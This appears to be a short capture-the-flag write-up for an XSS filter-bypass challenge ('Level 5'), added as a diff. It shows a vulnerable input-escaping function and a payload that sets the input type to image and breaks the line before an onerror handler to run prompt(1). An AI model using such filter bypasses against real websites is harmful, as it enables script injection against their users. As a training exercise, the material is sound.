@@ -1,0 +1,21 @@
+Level 5
+
+function escape(input) {
+    // apply strict filter rules of level 0
+    // filter ">" and event handlers
+    input = input.replace(/>|on.+?=|focus/gi, '_');
+
+    return '<input value="' + input + '" type="text">';
+}
+
+Solution:-
+
+Suppose, I am thinking it's an image-input. 
+We simply set the type to image due to the fact that the type after cannot override the previous one,
+
+Then we can assign a src and then use an error handler:
+ 
+Ans-     "type=image src onerror
+          ="prompt(1)                          
+
+Note:- Don't forget to break the line aftrer "onerror".
